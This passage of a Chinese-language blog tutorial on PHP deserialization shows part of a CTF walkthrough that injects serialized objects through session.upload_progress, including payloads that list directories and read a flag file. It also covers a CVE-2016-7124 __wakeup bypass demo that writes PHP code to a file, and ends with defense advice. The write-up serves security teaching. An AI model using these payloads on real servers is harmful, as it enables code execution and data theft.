   <span class="hljs-string">"bytes_processed"</span> =&gt; <span class="hljs-number">57343250</span>, <span class="hljs-comment">// Amount of bytes received and processed for this file</span>
  ),
  <span class="hljs-comment">// An other file, not finished uploading, in the same request</span>
  <span class="hljs-number">1</span> =&gt; <span class="hljs-keyword">array</span>(
   <span class="hljs-string">"field_name"</span> =&gt; <span class="hljs-string">"file2"</span>,
   <span class="hljs-string">"name"</span> =&gt; <span class="hljs-string">"bar.avi"</span>,
   <span class="hljs-string">"tmp_name"</span> =&gt; <span class="hljs-literal">NULL</span>,
   <span class="hljs-string">"error"</span> =&gt; <span class="hljs-number">0</span>,
   <span class="hljs-string">"done"</span> =&gt; <span class="hljs-literal">false</span>,
   <span class="hljs-string">"start_time"</span> =&gt; <span class="hljs-number">1234567899</span>,
   <span class="hljs-string">"bytes_processed"</span> =&gt; <span class="hljs-number">54554</span>,
  ),
 )
);</code></pre>
<p>其中，session中的<code>field_name</code>和<code>name</code>都是我们可控的输入点！</p>
<p>下面我们就开始解题拿到flag</p>
<p>首先，<code>http://web.jarvisoj.com:32784/index.php?phpinfo</code>查询设置</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230626184058849.png" alt="image-20230626184058849"></p>
<pre><code class="hljs plaintext">session.upload_progress.enabled = On   --表明允许上传进度跟踪，并填充$ _SESSION变量
session.upload_progress.cleanup = Off  --表明所有POST数据（即完成上传）后，不清理进度信息($ _SESSION变量)</code></pre>
<p>即允许上传进度跟踪且结束后不清除数据，更有利使用<code>session.upload_progress.name</code>来将利用代码写入<code>session</code>文件</p>
<p>构造<code>POST</code>表单提交上传文件</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"http://web.jarvisoj.com:32784/index.php"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">"multipart/form-data"</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"123"</span> /&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"file"</span> /&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></code></pre>
<p>构造序列化字符串作为<code>payload</code>（利用代码）</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mdzz</span>=<span class="hljs-string">'print_r(scandir(dirname(__FILE__)));'</span>;
}
<span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">OowoO</span>();
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);
<span class="hljs-meta">?&gt;</span>
<span class="hljs-comment">//O:5:"OowoO":1:{s:4:"mdzz";s:36:"print_r(scandir(dirname(__FILE__)));";}</span></code></pre>
<p>为了防止<code>"</code>被转义，我们在<code>payload</code>中加入<code>\</code></p>
<p>随意选择文件，点击表单提交，使用抓包工具<code>burpsuite</code>抓取请求包</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230626184235633.png" alt="image-20230626184235633"></p>
<p>并修改<code>filename</code>值为</p>
<pre><code class="hljs php">|O:<span class="hljs-number">5</span>:\<span class="hljs-string">"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";}</span></code></pre>
<p>发送请求包，代码执行过程分析：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230626184320730.png" alt="image-20230626184320730"></p>
<p>因此直接执行<code>print_r(scandir(dirname(__FILE__)));</code>并返回</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230626184641153.png" alt="image-20230626184641153"></p>
<pre><code class="hljs php">phpinfo`查看当前目录，`/opt/lampp/htdocs/</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230626184700223.png" alt="image-20230626184700223"></p>
<p>构造最终<code>payload</code>读取<code>Here_1s_7he_fl4g_buT_You_Cannot_see.php</code>文件内容，即flag</p>
<pre><code class="hljs php">|O:<span class="hljs-number">5</span>:\<span class="hljs-string">"OowoO\":1:{s:4:\"mdzz\";s:88:\"print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";}</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230626184723948.png" alt="image-20230626184723948"></p>
<p>这里不知道为啥访问不了连接，找到了原靶场也不行…</p>
<p><strong>ctfshow web263</strong></p>
<p><strong>session.upload_progress进行文件包含和反序列化渗透</strong><br>
<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/202819.ht">https://www.freebuf.com/vuls/202819.ht</a></p>
<h2 id="127-cve-2016-7124">12.7 CVE-2016-7124</h2>
<h3 id="漏洞分析">漏洞分析</h3>
<p>该漏洞存在于PHP5小于5.6.25版本或PHP7小于7.0.10版本中，该漏洞简单来说就是当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过<code>__wakeup()</code>的执行，demo如下</p>
<pre><code class="hljs php">&lt;html&gt;
&lt;head&gt;
&lt;title&gt;PHP反序列化demo&lt;/title&gt;
&lt;meta charset=<span class="hljs-string">"utf-8"</span>&gt;
&lt;/head&gt;
&lt;body&gt;
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>{
    <span class="hljs-keyword">var</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">"Jacky"</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">"hello.php"</span>,<span class="hljs-string">"w"</span>);
        <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$this</span>-&gt;name);
        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);
    }
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">        </span>{
            <span class="hljs-keyword">foreach</span>(<span class="hljs-title function_ invoke__">get_object_vars</span>(<span class="hljs-variable">$this</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) {
                    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$k</span> = <span class="hljs-literal">null</span>;
            }
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Waking up...\n"</span>;
        }
}
<span class="hljs-variable">$test</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'test'</span>];
<span class="hljs-variable">$test_unser</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$test</span>);
<span class="hljs-meta">?&gt;</span>
&lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>由于<code>__wakeup()</code>的执行顺序在<code>__destruct()</code>之前，所以<code>__wakeup()</code>会将对象内的所有属性设为NULL，在<code>__destruct()</code>执行时，没有内容会写到文件中。但使用漏洞，可以跳过<code>__wakeup()</code>，直接执行<code>__destruct()</code>，这样可以将属性内容写入文件中。</p>
<p>如果我们使用如下payload</p>
<pre><code class="hljs plaintext">test=O:4:"test":1:{s:4:"name";s:18:"&lt;?php phpinfo();?&gt;";}</code></pre>
<p>会执行<code>__wakeup()</code>函数，页面上会出现如下输出</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230629193140701.png" alt="image-20230629193140701"></p>
<p>如果我们使用如下payload</p>
<pre><code class="hljs plaintext">test=O:4:"test":2:{s:4:"name";s:18:"&lt;?php phpinfo();?&gt;";}</code></pre>
<p>会执行<code>__wakeup()</code>函数，页面上会出现如下输出</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230629193250527.png" alt="image-20230629193250527"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230629193319332.png" alt="image-20230629193319332"></p>
<p>这里发现个有趣的事情,echo 不能打印出PHP标识符&lt;?php,因此要url编码一下</p>
<p>GPT回答:</p>
<pre><code class="hljs plaintext">在PHP中，&lt;?php 是一个标记（tag），用于指示 PHP 代码的起始点。当使用 echo 函数时，它会将其后的内容作为字符串进行输出。但是，如果你尝试使用 echo 输出 &lt;?php，它将被解释为一个 PHP 的起始标记，而不是普通的字符串。

为了在 echo 中输出 &lt;?php 这样的 PHP 标识符，你可以使用转义字符 \ 来告诉 PHP 解释器不要将其解释为标记，而是作为普通的文本。

1.使用htmlspecialchars函数对字符串进行转义：
echo htmlspecialchars('&lt;?php');

2.将&lt;?php拆分为两部分并连接起来：
echo '&lt;?' . 'php';</code></pre>
<h2 id="防御方法">防御方法：</h2>
<p>1.严格的把控 unserailize() 函数的参数，不要给攻击者任何输入的可能<br>
2.在文件系统函数的参数可控时，对参数进行严格的过滤。<br>
3.严格检查上传文件的内容，而不是只检查文件头。<br>
4.在条件允许的情况下禁用可执行系统命令、代码的危险函数。</p>
<p>PHP手册：<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/book.stream.php">https://www.php.net/manual/en/book.stream.php</a></p>

<div class="article-footer fs14">
    <section id="license">
      <div class="header"><span>许可协议</span></div>
      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
</div>
    </section>
    </div>
</article>
<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2023/07/27/ajax-xiang-jie/">Ajax详解</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/07/27/inget/">攻防世界-inget</a></div></section></div>




  <div class="related-wrap md-text" id="comments">
    <section class='header cmt-title cap theme'>
      <p>感谢大佬们的不吝赐教！</p>

    </section>
    <section class='body cmt-body twikoo'>
      

<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
    </section>
  </div>



<footer class="page-footer footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



<widget class="widget-wrapper toc" id="data-toc" collapse="true"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">PHP反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E7%AE%80%E4%BB%8B"><span class="toc-text">0x01 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%B8%BA%E4%BD%95%E8%A6%81-php-%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">0X02 为何要 PHP 的序列化和反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%B8%B8%E8%A7%81%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E6%A0%BC%E5%BC%8F"><span class="toc-text">0x03 常见的序列化格式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E6%A1%88%E4%BE%8B"><span class="toc-text">0x04 案例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E4%BF%AE%E9%A5%B0%E7%AC%A6"><span class="toc-text">0x05 访问控制修饰符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">0x06 PHP-反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#61-%E5%B8%B8%E8%A7%81%E7%9A%84php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text">6.1 常见的PHP魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#62-%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-text">6.2 漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#63-%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%95%E6%93%8E"><span class="toc-text">6.3 序列化引擎</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87%E5%B0%8Ftrick"><span class="toc-text">0x07 反序列化绕过小Trick</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#71-php71%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E7%B1%BB%E5%B1%9E%E6%80%A7%E4%B8%8D%E6%95%8F%E6%84%9F"><span class="toc-text">7.1 php7.1+反序列化对类属性不敏感</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#72-%E7%BB%95%E8%BF%87__wakeup"><span class="toc-text">7.2 绕过__wakeup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#73-%E7%BB%95%E8%BF%87%E9%83%A8%E5%88%86%E6%AD%A3%E5%88%99"><span class="toc-text">7.3 绕过部分正则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#74-%E5%88%A9%E7%94%A8%E5%BC%95%E7%94%A8"><span class="toc-text">7.4 利用引用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#75-16%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E7%9A%84%E8%BF%87%E6%BB%A4"><span class="toc-text">7.5 16进制绕过字符的过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#76-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="toc-text">7.6 PHP反序列化字符逃逸</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5"><span class="toc-text">0x08 对象注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-pop%E9%93%BE%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D"><span class="toc-text">0x09 POP链简单介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><span class="toc-text">0x10 PHP原生类反序列化利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#101-errorexception-%E5%86%85%E7%BD%AE%E7%B1%BB%E8%BF%9B%E8%A1%8C-xss"><span class="toc-text">10.1 Error&#x2F;Exception 内置类进行 XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#error-%E5%86%85%E7%BD%AE%E7%B1%BB"><span class="toc-text">Error 内置类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exception-%E5%86%85%E7%BD%AE%E7%B1%BB"><span class="toc-text">Exception 内置类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#102-errorexception-%E5%86%85%E7%BD%AE%E7%B1%BB%E7%BB%95%E8%BF%87%E5%93%88%E5%B8%8C%E6%AF%94%E8%BE%83"><span class="toc-text">10.2 Error&#x2F;Exception 内置类绕过哈希比较</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#error-%E7%B1%BB"><span class="toc-text">Error 类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exception-%E7%B1%BB"><span class="toc-text">Exception 类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#103-soapclient-%E7%B1%BB%E8%BF%9B%E8%A1%8C-ssrf"><span class="toc-text">10.3 SoapClient 类进行 SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#soapclient-%E7%B1%BB"><span class="toc-text">SoapClient 类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#104-simplexmlelement-%E7%B1%BB%E8%BF%9B%E8%A1%8C-xxe"><span class="toc-text">10.4 SimpleXMLElement 类进行 XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#simplexmlelement-%E7%B1%BB"><span class="toc-text">SimpleXMLElement 类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#105-ziparchive-%E7%B1%BB%E6%9D%A5%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6"><span class="toc-text">10.5 ZipArchive 类来删除文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ziparchive-%E7%B1%BB"><span class="toc-text">ZipArchive 类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#106-%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95%E7%B1%BB"><span class="toc-text">10.6 遍历目录类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#directoryiterator-%E7%B1%BB"><span class="toc-text">DirectoryIterator 类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#filesystemiterator-%E7%B1%BB"><span class="toc-text">FilesystemIterator 类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#globiterator-%E7%B1%BB"><span class="toc-text">GlobIterator 类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%8F%AF%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95%E7%B1%BB%E7%BB%95%E8%BF%87-open_basedir"><span class="toc-text">使用可遍历目录类绕过 open_basedir</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#107-%E5%8F%AF%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%B1%BB"><span class="toc-text">10.7 可读取文件类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#splfileobject-%E7%B1%BB"><span class="toc-text">SplFileObject 类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#108-%E5%8F%8D%E5%B0%84%E7%B1%BBreflection"><span class="toc-text">10.8 反射类Reflection</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#reflectionmethod-%E7%B1%BB%E8%8E%B7%E5%8F%96%E7%B1%BB%E6%96%B9%E6%B3%95%E7%9A%84%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF"><span class="toc-text">ReflectionMethod 类获取类方法的相关信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#reflectionclass%E7%B1%BB%E8%AF%BB%E5%8F%96%E7%B1%BB%E7%9A%84%E5%B1%9E%E6%80%A7%E5%92%8C%E6%96%B9%E6%B3%95%E5%90%8D"><span class="toc-text">ReflectionClass类读取类的属性和方法名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#reflectionfunction%E7%B1%BB%E5%86%99webshell"><span class="toc-text">ReflectionFunction类写Webshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">0x11 Phar反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#111-%E4%BB%80%E4%B9%88%E6%98%AFphar%E6%96%87%E4%BB%B6"><span class="toc-text">11.1 什么是phar文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#112-phar%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84"><span class="toc-text">11.2 phar文件的结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#113-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">11.3 漏洞利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#114-%E5%8F%97%E5%BD%B1%E5%93%8D%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-text">11.4 受影响的函数：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#115-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-text">11.5 绕过方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#116-%E4%BB%8E-php-%E6%BA%90%E7%A0%81%E6%8E%A2%E7%B4%A2-phar-%E5%88%A9%E7%94%A8%E6%88%90%E5%8A%9F%E7%9A%84%E6%B7%B1%E5%B1%82%E5%8E%9F%E5%9B%A0"><span class="toc-text">11.6 从 PHP 源码探索 phar 利用成功的深层原因</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-php-%E6%B5%81%E7%9A%84%E6%A6%82%E5%BF%B5"><span class="toc-text">1. PHP 流的概念</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%B5%81%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AEwrapper"><span class="toc-text">2. 流封装协议（wrapper）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#21-http%E6%B5%81%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE"><span class="toc-text">2.1 http:&#x2F;&#x2F;流封装协议</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#22-file%E6%B5%81%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE"><span class="toc-text">2.2 file:&#x2F;&#x2F;流封装协议</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%BC%80%E5%A7%8B%E5%90%91%E4%B8%8B%E6%8C%96%E6%8E%98"><span class="toc-text">3. 开始向下挖掘</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-php-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">0x12 php-session反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#121-session%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D"><span class="toc-text">12.1 session简单介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#122-session-%E7%9A%84%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6"><span class="toc-text">12.2 session 的存储机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#123-session%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E7%9A%84%E5%87%A0%E4%B8%AAtip"><span class="toc-text">12.3 session文件创建的几个tip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#124-php-session%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-text">12.4 PHP session工作流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#125-phpini%E4%B8%AD%E4%B8%80%E4%BA%9Bsession%E9%85%8D%E7%BD%AE"><span class="toc-text">12.5 php.ini中一些session配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#126-%E4%B8%8D%E5%90%8C%E7%9A%84%E5%BC%95%E6%93%8E%E6%9D%A5%E5%A4%84%E7%90%86session%E6%96%87%E4%BB%B6"><span class="toc-text">12.6 不同的引擎来处理session文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-php%E5%A4%84%E7%90%86%E5%99%A8"><span class="toc-text">1. php处理器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-php_binary%E5%A4%84%E7%90%86%E5%99%A8"><span class="toc-text">2. php_binary处理器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-php_serialize-%E5%A4%84%E7%90%86%E5%99%A8"><span class="toc-text">3. php_serialize 处理器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-session%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">4. session的反序列化漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#127-cve-2016-7124"><span class="toc-text">12.7 CVE-2016-7124</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 